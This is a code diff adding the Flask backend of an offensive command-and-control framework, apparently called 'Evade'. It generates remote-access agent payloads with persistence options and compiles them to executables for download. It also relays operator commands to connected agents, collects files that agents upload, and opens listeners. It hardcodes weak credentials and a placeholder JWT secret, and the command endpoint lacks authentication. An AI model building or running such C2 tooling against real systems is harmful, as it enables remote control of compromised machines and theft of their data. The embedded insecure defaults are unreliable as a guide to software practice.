@@ -1,0 +1,345 @@
+from flask import Flask, request, jsonify, send_from_directory
+from flask_cors import CORS
+import subprocess
+import uuid
+import os
+import logging
+import threading
+from flask_socketio import SocketIO, emit
+import socket
+import json
+from werkzeug.security import check_password_hash, generate_password_hash
+from werkzeug.utils import secure_filename
+from flask_jwt_extended import JWTManager, create_access_token, jwt_required, get_jwt_identity
+from dotenv import load_dotenv
+
+from agent_templates import tcp_agent_template, http_agent_template, https_agent_template
+from tcp_server import start_tcp_server
+from database import init_db,db,Agent,Session,User  
+
+app = Flask(__name__)
+socketio = SocketIO(app, cors_allowed_origins="http://localhost:3000")
+
+load_dotenv()
+
+# Define the path to the uploads folder
+UPLOADS_FOLDER = os.path.join(app.root_path, 'uploads')
+app.config['UPLOADS_FOLDER'] = UPLOADS_FOLDER
+
+# Ensure the uploads folder exists
+os.makedirs(UPLOADS_FOLDER, exist_ok=True)
+
+app.config['JWT_SECRET_KEY'] = 'your_jwt_secret_key'
+jwt = JWTManager(app)
+
+CORS(app, supports_credentials=True, origins='http://localhost:3000')
+
+app.config['UPLOAD_FOLDER'] = r"E:\\Github\\Repos\\Evade-A-C2-Framework\\COMPELTE\\generated_payloads"
+os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
+
+app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://postgres:postgres@127.0.0.1:5432/evade-c2'
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+
+init_db(app)
+
+# Static users dictionary
+users = {'rochak': generate_password_hash('rochak')}
+
+@app.route('/api/login', methods=['POST'])
+def login():
+    username = request.json.get('username')
+    password = request.json.get('password')
+    user = User.query.filter_by(username=username).first()
+    
+    if user and check_password_hash(user.password_hash, password):
+        access_token = create_access_token(identity=username)
+        return jsonify(access_token=access_token), 200
+    else:
+        return jsonify({'message': 'Invalid credentials'}), 401
+
+
+@app.route('/api/logout', methods=['POST'])
+@jwt_required()
+def logout():
+    # JWT logout is handled client-side by removing the token, so this is just a placeholder
+    return jsonify({'message': 'User logged out successfully'}), 200
+
+@app.route('/api/check_login', methods=['GET'])
+@jwt_required()
+def check_login():
+    current_user = get_jwt_identity()
+    if current_user:
+        return jsonify({'logged_in': True, 'user': current_user}), 200
+    return jsonify({'logged_in': False}), 401
+
+def create_update_default_admin():
+    with app.app_context():
+        admin_username = os.environ.get('DEFAULT_ADMIN_USERNAME')
+        admin_password = os.environ.get('DEFAULT_ADMIN_PASSWORD')
+        admin_user = User.query.filter_by(username=admin_username).first()
+        
+        if not admin_user:
+            # If the admin doesn't exist, create them
+            admin_user = User(username=admin_username, password_hash=generate_password_hash(admin_password))
+            db.session.add(admin_user)
+        else:
+            # Optionally, update the existing admin password
+            admin_user.password_hash = generate_password_hash(admin_password)
+        db.session.commit()
+
+create_update_default_admin()
+
+@app.route('/api/execute-command', methods=['POST'])
+def execute_command():
+    data = request.get_json()
+    agent_id = data.get('agentId')
+    command = data.get('command')
+    
+    # Connect to your TCP server
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect(('127.0.0.1', 62347))
+        # Send agent_id and command in a structured format
+        message = json.dumps({'agent_id': agent_id, 'command': command})
+        s.sendall(message.encode('utf-8'))
+
+        # Wait for acknowledgment or response from the TCP server
+        response = s.recv(4092).decode('utf-8')
+        print("------------------------------------")
+        print(f'Received: {response}')
+        print("------------------------------------")
+
+    return jsonify({'status': 'Command sent to TCP server', 'response': response}), 200
+
+# Flask route to handle file uploads in your backend
+@app.route('/upload', methods=['POST'])
+def upload_file():
+    agent_id = request.form['agent_id']
+    file = request.files.get('file')
+    if file:
+        filename = secure_filename(file.filename)
+        # You might want to organize uploads by agent ID
+        agent_upload_folder = os.path.join(app.config['UPLOADS_FOLDER'], agent_id)
+        os.makedirs(agent_upload_folder, exist_ok=True)
+        
+        file_path = os.path.join(agent_upload_folder, filename)
+        file.save(file_path)
+        
+        return jsonify({'message': f'File {filename} uploaded successfully.'})
+    else:
+        return jsonify({'error': 'No file provided'}), 400
+
+@app.route('/list_files/<agent_id>', methods=['GET'])
+def list_files(agent_id):
+    agent_upload_folder = os.path.join(app.config['UPLOADS_FOLDER'], agent_id)
+    if os.path.isdir(agent_upload_folder):
+        files = os.listdir(agent_upload_folder)
+        return jsonify({'files': files})
+    else:
+        return jsonify({'error': 'Agent not found'}), 404
+
+@app.route('/api/configure-listener', methods=['POST'])
+def configure_listener():
+    data = request.get_json()
+    protocol = data.get('protocol')
+    port = int(data.get('port'))
+    localIP = data.get('localIP')
+    if not protocol or not port:
+        return jsonify({'error': 'Missing required fields'}), 400
+
+    if protocol.lower() == 'tcp':
+        # Check if the port is already in use
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.bind((localIP, port))
+        except OSError:
+            return jsonify({'error': f'TCP port {port} is already in use'}), 400
+
+        try:
+            thread = threading.Thread(target=start_tcp_server, args=(localIP, port))
+            thread.daemon = True
+            thread.start()
+            return jsonify({'message': 'TCP server started'}), 200
+        except Exception as e:
+            return jsonify({'error': f'Failed to start TCP listener: {str(e)}'}), 500
+
+    if protocol.lower() == 'http':
+        #start_http_server()
+        pass
+
+    if protocol.lower() == 'https':
+        #start_https_server()
+        pass
+
+    print({'message': f'Listener configured for {protocol} on {localIP} port {port}'})
+    return jsonify({'message': f'Listener configured for {protocol} on {localIP} port {port}'}), 200
+    
+
+@app.route('/download/<filename>')
+def download_payload(filename):
+    try:
+        # Log the requested filename for download
+        print(f"Requested filename for download: {filename}")
+
+        # Securely join the filename to the uploads folder
+        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        print(f"Constructed filepath: {filepath}")
+
+        # Check if the file exists
+        if not os.path.exists(filepath):
+            print(f"File not found: {filepath}")  # Changed to print for visibility in console
+            return jsonify({"error": "File not found"}), 404
+
+        # Print the directory and filename being sent
+        print(f"Sending file from directory: {app.config['UPLOAD_FOLDER']} with filename: {filename}")
+
+        # Use send_from_directory with the corrected parameters
+        return send_from_directory(directory=app.config['UPLOAD_FOLDER'], path=filename, as_attachment=True)
+    except Exception as e:
+        # Print the exception if the file download fails
+        print("Failed to download file:", e)
+        return jsonify({"error": "Internal server error"}), 500
+
+@app.route('/api/generate-payload', methods=['POST'])
+def generate_payload():
+    data = request.get_json()
+    agent_id=str(uuid.uuid4())
+    print(agent_id)
+    print(data)
+    required_fields = ["name", "lhost", "lport", "type", "protocol", "persistence"]
+    if not all(field in data for field in required_fields):
+        return jsonify({"error": "Missing required fields"}), 400
+    # Extract parameters
+    name, lhost, lport, payload_type, protocol, persistence = (
+        data["name"], data["lhost"], data["lport"], data["type"], data["protocol"], data["persistence"]
+    )
+
+    userAgent = data.get("userAgent", "")
+    sleepTimer = data.get("sleepTimer", "")
+
+    # Choose the appropriate template function and prepare parameters
+    if protocol == "tcp":
+        agent_code = tcp_agent_template(lhost=lhost, lport=lport, persistence=persistence,agent_id=agent_id)
+        # write into database about the agent
+        # Prepare extra data for storage
+        extra_data = {
+            "name": name,
+            "lhost": lhost,
+            "lport": lport,
+            "type": payload_type,
+            "persistence": persistence,
+            "userAgent": userAgent,
+            "sleepTimer": sleepTimer
+        }
+
+        # Initialize a new Agent object with the data
+        new_agent = Agent(
+            agent_id=agent_id,
+            protocol=protocol,
+            extra_data=extra_data  # Storing extra data as JSON
+        )
+
+        # Add the new agent to the session and commit to save it to the database
+        db.session.add(new_agent)
+        db.session.commit()
+
+    elif protocol == "http":
+        try:
+            print(f"Handling {protocol.upper()} protocol")
+            print(f"User-Agent: {data.get('userAgent', 'Not provided')}, Sleep Timer: {data.get('sleepTimer', 'Not provided')}")
+            
+            if not all(param in data for param in ["userAgent", "sleepTimer"]):
+                return jsonify({"error": "Missing required HTTP fields"}), 400
+            print("----------------------------------------------")
+            print("Sabai chha data haru")
+            print("----------------------------------------------")
+            # Use the HTTP agent template function
+            agent_code = http_agent_template(
+                lhost=lhost, 
+                lport=lport, 
+                persistence=persistence, 
+                userAgent=userAgent, 
+                sleepTimer=sleepTimer
+            )
+
+            print(agent_code)
+        except Exception as e:
+            # Log the exception or print for debugging
+            print(f"Error generating HTTP agent: {e}")
+            # Return a response indicating an internal error occurred
+            return jsonify({"error": "An error occurred while generating the HTTP agent", "details": str(e)}), 500
+
+    elif protocol == "https":
+        print(f"Handling {protocol.upper()} protocol")
+        print(f"User-Agent: {data.get('userAgent', 'Not provided')}, Sleep Timer: {data.get('sleepTimer', 'Not provided')}")
+        
+        if not all(param in data for param in ["userAgent", "sleepTimer"]):
+            return jsonify({"error": "Missing required HTTPS fields"}), 400
+
+        # Use the HTTPS agent template function
+        agent_code = https_agent_template(
+            lhost=lhost, 
+            lport=lport, 
+            persistence=persistence, 
+            userAgent=data['userAgent'], 
+            sleepTimer=data['sleepTimer']
+        )
+
+    else:
+        return jsonify({"error": "Invalid protocol specified"}), 400
+
+    print("----------------------------------------------")
+    print("Filename ma pugyo")
+    print("----------------------------------------------")
+    # Save the generated code to a file
+    filename = f"{name}_{str(uuid.uuid4())}{'.py' if payload_type == '.py' else '.exe'}"
+    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+    with open(filepath, 'w') as file:
+        file.write(agent_code)
+
+    # Compile to .exe if needed
+    if payload_type == '.exe':
+        try:
+            subprocess.run(['pyinstaller', '--onefile', '--distpath', app.config['UPLOAD_FOLDER'], '--name', filename, filepath], check=True)
+        except subprocess.CalledProcessError as e:
+            logging.error(f"Failed to compile .exe file: {e}")
+            return jsonify({"error": "Failed to compile .exe file"}), 500
+
+    download_url = f"http://{request.host}/download/{filename}"
+    return jsonify({"message": "Payload generated successfully", "downloadUrl": download_url})
+
+@socketio.on('connect')
+def handle_connect():
+    print("Client connected")
+    # Optionally, you can emit a message back to the newly connected client
+    emit('connection_status', {'message': 'Successfully connected to the server'})
+
+def notify_frontend(agent_id):
+    """Function to notify the frontend about an agent's status."""
+    with app.app_context():
+        session = Session()
+        agent = session.query(Agent).filter_by(agent_id=agent_id).first()
+        if agent:
+            print(f"Agent Data: ID={agent.agent_id}, Protocol={agent.protocol}, Last Seen={agent.last_seen}")
+            print("-------------------------------------------------------")
+            print("EMIT EMIT")
+            print("-------------------------------------------------------")
+            socketio.emit('agent_update', {
+                'agent_id': agent.agent_id,
+                'protocol': agent.protocol,
+                'last_seen': agent.last_seen.strftime('%Y-%m-%d %H:%M:%S')
+            })
+        session.close()
+
+@app.route('/api/notify-agent-connection', methods=['POST'])
+def notify_agent_connection():
+    data = request.json
+    agent_id = data.get('agent_id')
+    if agent_id:
+        # Assuming notify_frontend is already defined and emits a WebSocket message
+        notify_frontend(agent_id)
+        return jsonify({'status': 'success'}), 200
+    return jsonify({'error': 'Missing agent_id'}), 400
+
+if __name__ == "__main__":
+    #app.run(debug=True, port=5002)
+    socketio.run(app,debug=True, port=5002,allow_unsafe_werkzeug=True)
